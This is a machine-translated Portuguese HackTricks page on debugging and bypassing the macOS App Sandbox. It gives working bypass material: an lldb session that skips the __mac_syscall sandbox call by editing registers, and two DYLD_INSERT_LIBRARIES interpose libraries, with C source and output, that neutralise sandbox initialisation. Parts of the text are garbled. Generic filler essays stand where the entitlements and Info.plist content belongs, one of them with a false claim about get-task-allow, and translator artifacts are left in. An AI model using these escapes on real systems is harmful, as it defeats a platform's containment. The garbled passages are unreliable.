# Depuração e Bypass do Sandbox do macOS

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Processo de carregamento do Sandbox

<figure><img src="../../../../.gitbook/assets/image (2).png" alt=""><figcaption><p>Imagem de <a href="http://newosxbook.com/files/HITSB.pdf">http://newosxbook.com/files/HITSB.pdf</a></p></figcaption></figure>

Na imagem anterior, é possível observar **como o sandbox será carregado** quando um aplicativo com a permissão **`com.apple.security.app-sandbox`** é executado.

O compilador irá vincular `/usr/lib/libSystem.B.dylib` ao binário.

Então, **`libSystem.B`** irá chamar várias outras funções até que o **`xpc_pipe_routine`** envie as permissões do aplicativo para o **`securityd`**. O Securityd verifica se o processo deve ser quarentenado dentro do Sandbox e, se sim, ele será quarentenado.\
Por fim, o sandbox será ativado com uma chamada para **`__sandbox_ms`** que chamará **`__mac_syscall`**.

## Possíveis Bypasses

### Executar binário sem Sandbox

Se você executar um binário que não será colocado em um sandbox a partir de um binário colocado em um sandbox, ele **será executado dentro do sandbox do processo pai**.

### Depuração e bypass do Sandbox com lldb

Vamos compilar um aplicativo que deve ser colocado em um sandbox:

{% tabs %}
{% tab title="sand.c" %}
```c
#include <stdlib.h>
int main() {
    system("cat ~/Desktop/del.txt");
}
```
{% endtab %}

{% tab title="macOS Sandbox Debug and Bypass" %}

# Depuração e Bypass do Sandbox do macOS

O Sandbox do macOS é uma tecnologia de segurança que limita o acesso de um aplicativo a recursos do sistema, como arquivos, pastas e processos. O objetivo é impedir que um aplicativo malicioso cause danos ao sistema ou roube informações confidenciais. No entanto, como qualquer tecnologia de segurança, o Sandbox não é perfeito e pode ser contornado por um invasor experiente.

Neste guia, exploraremos algumas técnicas de depuração e bypass do Sandbox do macOS.

## Depuração do Sandbox

A depuração do Sandbox envolve a análise do comportamento do aplicativo em um ambiente controlado para identificar quais recursos do sistema ele está tentando acessar. Isso pode ser feito usando ferramentas como o `sandbox-exec` e o `dtruss`.

O `sandbox-exec` é uma ferramenta de linha de comando que permite executar um aplicativo em um ambiente de sandbox personalizado. Isso pode ser útil para testar como um aplicativo se comporta em um ambiente de sandbox específico e identificar quais recursos do sistema ele está tentando acessar.

O `dtruss` é uma ferramenta de linha de comando que permite rastrear as chamadas do sistema feitas por um aplicativo. Isso pode ser útil para identificar quais recursos do sistema o aplicativo está tentando acessar e como ele está tentando acessá-los.

## Bypass do Sandbox

O bypass do Sandbox envolve a exploração de vulnerabilidades no Sandbox ou no próprio sistema operacional para obter acesso a recursos do sistema que normalmente seriam restritos. Algumas técnicas comuns de bypass do Sandbox incluem:

- **Injeção de código**: a injeção de código envolve a inserção de código malicioso em um processo legítimo para obter acesso aos recursos do sistema que o processo tem permissão para acessar. Isso pode ser feito usando ferramentas como o `ptrace` e o `DYLD_INSERT_LIBRARIES`.

- **Escalonamento de privilégios**: o escalonamento de privilégios envolve a obtenção de privilégios de root ou de outro usuário com mais permissões do que o usuário atual. Isso pode ser feito explorando vulnerabilidades no sistema operacional ou em aplicativos com privilégios elevados.

- **Exploração de vulnerabilidades do Sandbox**: a exploração de vulnerabilidades do Sandbox envolve a identificação e exploração de falhas no Sandbox para obter acesso a recursos do sistema que normalmente seriam restritos. Isso pode ser feito usando técnicas como a injeção de código e a escalada de privilégios.

## Conclusão

Embora o Sandbox do macOS seja uma tecnologia de segurança eficaz, não é perfeita e pode ser contornada por um invasor experiente. É importante estar ciente das técnicas de depuração e bypass do Sandbox para poder identificar e mitigar possíveis ameaças à segurança do sistema.
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>com.apple.security.app-sandbox</key>
<true/>
</dict>
</plist>
```
{% endtab %}

{% tab title="Info.plist" %}

# Depuração e Bypass do Sandbox do macOS

O Sandbox do macOS é uma tecnologia de segurança que limita o acesso de um aplicativo a recursos do sistema, como arquivos, pastas e processos. O objetivo é impedir que um aplicativo malicioso cause danos ao sistema ou roube informações confidenciais. No entanto, os hackers podem tentar contornar essas proteções para executar código malicioso com privilégios elevados.

## Depuração do Sandbox

A depuração do Sandbox é uma técnica que permite que um aplicativo ignore as restrições do Sandbox e acesse recursos do sistema que normalmente seriam proibidos. Isso pode ser útil para desenvolvedores que desejam testar seus aplicativos em um ambiente controlado, mas também pode ser usado por hackers para explorar vulnerabilidades no sistema.

Para depurar um aplicativo do Sandbox, você precisa adicionar uma chave especial ao arquivo Info.plist do aplicativo. A chave é chamada de `com.apple.security.get-task-allow` e deve ser definida como `true`. Isso permite que o aplicativo seja executado em um depurador e acesse recursos do sistema que normalmente seriam proibidos.

## Bypass do Sandbox

O Bypass do Sandbox é uma técnica que permite que um aplicativo ignore completamente as restrições do Sandbox e acesse recursos do sistema sem restrições. Isso é muito mais perigoso do que a depuração do Sandbox, pois permite que um aplicativo malicioso execute código com privilégios elevados sem ser detectado.

Existem várias maneiras de contornar o Sandbox do macOS, incluindo:

- Usando vulnerabilidades no sistema operacional para escapar do Sandbox
- Usando técnicas de injeção de código para executar código em um processo com privilégios elevados
- Usando técnicas de engenharia social para convencer o usuário a conceder permissões ao aplicativo

Para se proteger contra o Bypass do Sandbox, é importante manter o sistema operacional e os aplicativos atualizados com as últimas correções de segurança e não conceder permissões a aplicativos desconhecidos ou suspeitos. Além disso, é importante ter um software antivírus instalado e atualizado para detectar e bloquear ameaças de segurança.
```xml
<plist version="1.0">
<dict>
    <key>CFBundleIdentifier</key>
    <string>xyz.hacktricks.sandbox</string>
    <key>CFBundleName</key>
    <string>Sandbox</string>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}

Em seguida, compile o aplicativo:

{% code overflow="wrap" %}
```bash
# Compile it
gcc -Xlinker -sectcreate -Xlinker __TEXT -Xlinker __info_plist -Xlinker Info.plist sand.c -o sand

# Create a certificate for "Code Signing"

# Apply the entitlements via signing
codesign -s <cert-name> --entitlements entitlements.xml sand
```
{% endcode %}

{% hint style="danger" %}
O aplicativo tentará **ler** o arquivo **`~/Desktop/del.txt`**, o que o **Sandbox não permitirá**.\
Crie um arquivo lá, pois uma vez que o Sandbox for contornado, ele poderá lê-lo:
```bash
echo "Sandbox Bypassed" > ~/Desktop/del.txt
```
{% endhint %}

Vamos depurar o aplicativo de xadrez para ver quando o Sandbox é carregado:
```bash
# Load app in debugging
lldb ./sand

# Set breakpoint in xpc_pipe_routine
(lldb) b xpc_pipe_routine

# run
(lldb) r

# This breakpoint is reached by different functionalities
# Check in the backtrace is it was de sandbox one the one that reached it
# We are looking for the one libsecinit from libSystem.B, like the following one:
(lldb) bt
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
  * frame #0: 0x00000001873d4178 libxpc.dylib`xpc_pipe_routine
    frame #1: 0x000000019300cf80 libsystem_secinit.dylib`_libsecinit_appsandbox + 584
    frame #2: 0x00000001874199c4 libsystem_trace.dylib`_os_activity_initiate_impl + 64
    frame #3: 0x000000019300cce4 libsystem_secinit.dylib`_libsecinit_initializer + 80
    frame #4: 0x0000000193023694 libSystem.B.dylib`libSystem_initializer + 272

# To avoid lldb cutting info
(lldb) settings set target.max-string-summary-length 10000

# The message is in the 2 arg of the xpc_pipe_routine function, get it with:
(lldb) p (char *) xpc_copy_description($x1)
(char *) $0 = 0x000000010100a400 "<dictionary: 0x6000026001e0> { count = 5, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REGISTRATION_MESSAGE_SHORT_NAME_KEY\" => <string: 0x600000c00d80> { length = 4, contents = \"sand\" }\n\t\"SECINITD_REGISTRATION_MESSAGE_IMAGE_PATHS_ARRAY_KEY\" => <array: 0x600000c00120> { count = 42, capacity = 64, contents =\n\t\t0: <string: 0x600000c000c0> { length = 14, contents = \"/tmp/lala/sand\" }\n\t\t1: <string: 0x600000c001e0> { length = 22, contents = \"/private/tmp/lala/sand\" }\n\t\t2: <string: 0x600000c000f0> { length = 26, contents = \"/usr/lib/libSystem.B.dylib\" }\n\t\t3: <string: 0x600000c00180> { length = 30, contents = \"/usr/lib/system/libcache.dylib\" }\n\t\t4: <string: 0x600000c00060> { length = 37, contents = \"/usr/lib/system/libcommonCrypto.dylib\" }\n\t\t5: <string: 0x600000c001b0> { length = 36, contents = \"/usr/lib/system/libcompiler_rt.dylib\" }\n\t\t6: <string: 0x600000c00330> { length = 33, contents = \"/usr/lib/system/libcopyfile.dylib\" }\n\t\t7: <string: 0x600000c00210> { length = 35, contents = \"/usr/lib/system/libcorecry"...

# The 3 arg is the address were the XPC response will be stored
(lldb) register read x2
  x2 = 0x000000016fdfd660
  
# Move until the end of the function
(lldb) finish

# Read the response
## Check the address of the sandbox container in SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY
(lldb) memory read -f p 0x000000016fdfd660 -c 1
0x16fdfd660: 0x0000600003d04000
(lldb) p (char *) xpc_copy_description(0x0000600003d04000)
(char *) $4 = 0x0000000100204280 "<dictionary: 0x600003d04000> { count = 7, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ID_KEY\" => <string: 0x600000c04d50> { length = 22, contents = \"xyz.hacktricks.sandbox\" }\n\t\"SECINITD_REPLY_MESSAGE_QTN_PROC_FLAGS_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY\" => <string: 0x600000c04e10> { length = 65, contents = \"/Users/carlospolop/Library/Containers/xyz.hacktricks.sandbox/Data\" }\n\t\"SECINITD_REPLY_MESSAGE_SANDBOX_PROFILE_DATA_KEY\" => <data: 0x600001704100>: { length = 19027 bytes, contents = 0x0000f000ba0100000000070000001e00350167034d03c203... }\n\t\"SECINITD_REPLY_MESSAGE_VERSION_NUMBER_KEY\" => <int64: 0xaa3e660cef06712f>: 1\n\t\"SECINITD_MESSAGE_TYPE_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_FAILURE_CODE\" => <uint64: 0xaabe660cef067127>: 0\n}"

# To bypass the sandbox we need to skip the call to __mac_syscall
# Lets put a breakpoint in __mac_syscall when x1 is 0 (this is the code to enable the sandbox)
(lldb) breakpoint set --name __mac_syscall --condition '($x1 == 0)'
(lldb) c

# The 1 arg is the name of the policy, in this case "Sandbox"
(lldb) memory read -f s $x0
0x19300eb22: "Sandbox"

#
# BYPASS
#

# Due to the previous bp, the process will be stopped in:
Process 2517 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
    frame #0: 0x0000000187659900 libsystem_kernel.dylib`__mac_syscall
libsystem_kernel.dylib`:
->  0x187659900 <+0>:  mov    x16, #0x17d
    0x187659904 <+4>:  svc    #0x80
    0x187659908 <+8>:  b.lo   0x187659928               ; <+40>
    0x18765990c <+12>: pacibsp

# To bypass jump to the b.lo address modifying some registers first
(lldb) breakpoint delete 1 # Remove bp
(lldb) register write $pc 0x187659928 #b.lo address
(lldb) register write $x0 0x00
(lldb) register write $x1 0x00
(lldb) register write $x16 0x17d
(lldb) c
Process 2517 resuming
Sandbox Bypassed!
Process 2517 exited with status = 0 (0x00000000)
```
{% hint style="warning" %}
Mesmo com o Sandbox burlado, o TCC perguntará ao usuário se ele deseja permitir que o processo leia arquivos da área de trabalho.
{% endhint %}

### Abusando de outros processos

Se a partir do processo do Sandbox você conseguir **comprometer outros processos** em execução em Sandboxes menos restritivas (ou sem nenhuma), você poderá escapar para suas Sandboxes:

{% content-ref url="../../macos-proces-abuse/" %}
[macos-proces-abuse](../../macos-proces-abuse/)
{% endcontent-ref %}

### Bypass de Interposição

Para obter mais informações sobre **Interposição**, consulte:

{% content-ref url="../../mac-os-architecture/macos-function-hooking.md" %}
[macos-function-hooking.md](../../mac-os-architecture/macos-function-hooking.md)
{% endcontent-ref %}

#### Interpor `_libsecinit_initializer` para evitar o Sandbox
```c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>

void _libsecinit_initializer(void);

void overriden__libsecinit_initializer(void) {
    printf("_libsecinit_initializer called\n");
}

__attribute__((used, section("__DATA,__interpose"))) static struct {
	void (*overriden__libsecinit_initializer)(void);
	void (*_libsecinit_initializer)(void);
}
_libsecinit_initializer_interpose = {overriden__libsecinit_initializer, _libsecinit_initializer};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
_libsecinit_initializer called
Sandbox Bypassed!
```
#### Interceptar `__mac_syscall` para evitar o Sandbox

{% code title="interpose.c" %}
```c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>
#include <string.h>

// Forward Declaration
int __mac_syscall(const char *_policyname, int _call, void *_arg);

// Replacement function
int my_mac_syscall(const char *_policyname, int _call, void *_arg) {
    printf("__mac_syscall invoked. Policy: %s, Call: %d\n", _policyname, _call);
    if (strcmp(_policyname, "Sandbox") == 0 && _call == 0) {
        printf("Bypassing Sandbox initiation.\n");
        return 0; // pretend we did the job without actually calling __mac_syscall
    }
    // Call the original function for other cases
    return __mac_syscall(_policyname, _call, _arg);
}

// Interpose Definition
struct interpose_sym {
    const void *replacement;
    const void *original;
};

// Interpose __mac_syscall with my_mac_syscall
__attribute__((used)) static const struct interpose_sym interposers[] __attribute__((section("__DATA, __interpose"))) = {
    { (const void *)my_mac_syscall, (const void *)__mac_syscall },
};
```
{% endcode %} (Não há nada para traduzir aqui, esta é apenas uma tag de formatação de código em markdown)
```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand

__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 0
Bypassing Sandbox initiation.
__mac_syscall invoked. Policy: Quarantine, Call: 87
__mac_syscall invoked. Policy: Sandbox, Call: 4
Sandbox Bypassed!
```
### Compilação Estática e Vínculo Dinâmico

[**Esta pesquisa**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/) descobriu duas maneiras de contornar o Sandbox. Como o sandbox é aplicado a partir do userland quando a biblioteca **libSystem** é carregada. Se um binário pudesse evitar o carregamento dela, ele nunca seria colocado em um sandbox:

* Se o binário fosse **completamente compilado estaticamente**, ele poderia evitar o carregamento dessa biblioteca.
* Se o **binário não precisasse carregar nenhuma biblioteca** (porque o vinculador também está em libSystem), ele não precisaria carregar libSystem.&#x20;

### Shellcodes

Observe que **mesmo shellcodes** em ARM64 precisam ser vinculados em `libSystem.dylib`:
```bash
ld -o shell shell.o -macosx_version_min 13.0
ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
```
### Abusando das Localizações de Início Automático

Se um processo com sandbox pode **escrever** em um lugar onde **mais tarde um aplicativo sem sandbox vai executar o binário**, ele será capaz de **escapar apenas colocando** o binário lá. Um bom exemplo desse tipo de localizações são `~/Library/LaunchAgents` ou `/System/Library/LaunchDaemons`.

Para isso, você pode precisar de **2 etapas**: fazer um processo com um sandbox **mais permissivo** (`file-read*`, `file-write*`) executar seu código, que realmente escreverá em um lugar onde será **executado sem sandbox**.

Verifique esta página sobre **Localizações de Início Automático**:

{% content-ref url="broken-reference" %}
[Link quebrado](broken-reference)
{% endcontent-ref %}

## Referências

* [http://newosxbook.com/files/HITSB.pdf](http://newosxbook.com/files/HITSB.pdf)
* [https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)
* [https://www.youtube.com/watch?v=mG715HcDgO8](https://www.youtube.com/watch?v=mG715HcDgO8)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de cibersegurança**? Você quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
